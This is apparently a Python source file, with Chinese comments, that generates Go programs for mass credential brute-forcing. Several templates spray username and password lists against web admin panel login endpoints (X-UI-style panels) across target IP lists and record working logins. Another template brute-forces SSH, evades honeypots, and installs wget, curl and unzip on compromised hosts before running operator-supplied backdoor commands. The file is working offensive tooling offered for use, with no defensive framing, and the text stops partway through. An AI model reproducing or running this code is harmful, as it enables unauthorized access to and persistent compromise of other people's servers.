# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit

# 依赖将在check_environment()中通过apt安装，这里仅做导入
try:
    import psutil
    import requests
    from openpyxl import Workbook, load_workbook
except ImportError:
    # 留空，让环境检查函数处理安装
    pass

try:
    import readline
except ImportError:
    pass

# =========================== xui.go模板1内容 (修正未使用的导入) ===========================
XUI_GO_TEMPLATE_1 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof" // 引入pprof
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

// 使用sync.Pool复用缓冲区，减少内存分配
var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024) // 4KB buffer
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100, // 增加每个主机的空闲连接数
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := fmt.Sprintf("username=%s&password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", url, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()
	
	select {
	case <-shutdownRequest:
		return 
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			var err error
			var resp *http.Response
			
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)
			resp, err = postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkUrl = fmt.Sprintf("https://%s:%s/login", ip, port)
				resp, err = postRequest(ctx2, checkUrl, username, password)
				cancel2()
			}

			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress() // 注释掉此行

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板2内容 (修正未使用的导入) ===========================
XUI_GO_TEMPLATE_2 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()
	
	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			var err error
			var resp *http.Response

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
			resp, err = postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkUrl = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
				resp, err = postRequest(ctx2, checkUrl, username, password)
				cancel2()
			}

			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				
				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}
	
	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板3内容 (修正未使用的导入) ===========================
XUI_GO_TEMPLATE_3 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{
		"username": username,
		"pass": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/json;charset=UTF-8")
	req.Header.Add("Accept", "application/json, text/plain, */*")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()
			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if data, ok := responseData["data"].(map[string]interface{}); ok {
						if token, exists := data["accessToken"].(string); exists && token != "" {
							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
							resp.Body.Close()
							return
						}
					}
				}
			}
			resp.Body.Close()
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板4内容 (修正未使用的导入) ===========================
XUI_GO_TEMPLATE_4 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req = req.WithContext(ctx)

	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]
	checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				continue
			}
			
			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						if data, ok := responseData["data"].(map[string]interface{}); ok {
							if token, exists := data["token"]; exists && token != "" {
								writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
								resp.Body.Close()
								return
							}
						}
					}
				}
			}
			resp.Body.Close()
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板5内容 (修正未使用的导入) ===========================
XUI_GO_TEMPLATE_5 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	form := fmt.Sprintf("user=%s&pass=%s", username, password)
	body := strings.NewReader(form)

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req = req.WithContext(ctx)

	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]
	checkUrl := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()
	// go updateProgress()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait() 
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
# =========================== xui.go模板6内容 (注释掉进度打印) ===========================
XUI_GO_TEMPLATE_6 = '''package main

import (
	"bufio"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
	addr := fmt.Sprintf("%s:%s", ip, port)
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return nil, false, err
	}
	return client, true, nil
}

func isLikelyHoneypot(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return true
	}
	defer session.Close()

	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
	if err != nil {
		return true
	}

	output, err := session.CombinedOutput("echo $((1+1))")
	if err != nil {
		return true
	}

	return strings.TrimSpace(string(output)) != "2"
}


func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}

	ip := strings.TrimSpace(parts[0])
	port := strings.TrimSpace(parts[1])

	found := false
	for _, username := range usernames {
		for _, password := range passwords {
			client, success, err := trySSH(ip, port, username, password)
			if err != nil {
				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
			}
			if success {
				defer client.Close()
				fakePasswords := []string{
					password + "1234",
					password + "abcd",
					password + "!@#$",
					password + "!@#12",
					password + "!@6c2",
				}
				isHoneypot := false
				for _, fake := range fakePasswords {
					if fakeClient, fakeSuccess, _ := trySSH(ip, port, username, fake); fakeSuccess {
						fakeClient.Close()
						isHoneypot = true
						break
					}
				}

				if isHoneypot {
					found = true
					break
				}

				if !isLikelyHoneypot(client) {
					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
					if ENABLE_BACKDOOR {
						deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
					}
				}
				found = true
				break
			}
		}
		if found {
			break
		}
	}
}

/*
func updateProgress() {
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()

	for {
		select {
		case <-progressTicker.C:
			count := atomic.LoadInt64(&completedCount)
			if totalTasks > 0 {
				percent := float64(count) / float64(totalTasks) * 100
				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
			}
			if count >= totalTasks {
				return
			}
		case <-shutdownRequest:
			return
		}
	}
}
*/

var retryFlag = false

func triggerFileCleanUp() {
	fmt.Println("清理文件并准备重新执行爆破...")
	if err := os.Remove("xui.txt"); err != nil {
		fmt.Println("删除文件失败:", err)
	} else {
		fmt.Println("已删除当前文件 xui.txt")
	}
	retryFlag = true
}
var ENABLE_BACKDOOR = {enable_backdoor}
var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}

func deployBackdoor(client *ssh.Client, ip string, port string, username string, password string, cmds []string) {
	if !checkUnzip(client) {
		fmt.Println("🔧 未检测到 unzip，尝试安装中...")
		if !installPackage(client, "unzip") || !checkUnzip(client) {
			fmt.Println("❌ unzip 安装失败")
			recordFailure(ip, port, username, password, "unzip 安装失败")
			return
		}
	}

	if !checkWget(client) {
		fmt.Println("🔧 未检测到 wget，尝试安装中...")
		if !installPackage(client, "wget") || !checkWget(client) {
			fmt.Println("❌ wget 安装失败")
			recordFailure(ip, port, username, password, "wget 安装失败")
			return
		}
	}

	if !checkCurl(client) {
		fmt.Println("🔧 未检测到 curl，尝试安装中...")
		if !installPackage(client, "curl") || !checkCurl(client) {
			fmt.Println("❌ curl 安装失败")
			recordFailure(ip, port, username, password, "curl 安装失败")
			return
		}
	}

	backdoorCmd := strings.Join(cmds, " && ")

	payloadSession, err := client.NewSession()
	if err != nil {
		fmt.Println("❌ 创建 payload session 失败:", err)
		recordFailure(ip, port, username, password, "无法创建 payload session")
		return
	}
	defer payloadSession.Close()

	err = payloadSession.Run(backdoorCmd)
	if err != nil {
		fmt.Println("❌ 后门命令执行失败")
		recordFailure(ip, port, username, password, "后门命令执行失败")
		return
	}

	fmt.Println("✅ 成功部署后门")
	recordSuccess(ip, port, username, password)
}

func checkUnzip(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v unzip >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func checkWget(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v wget >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

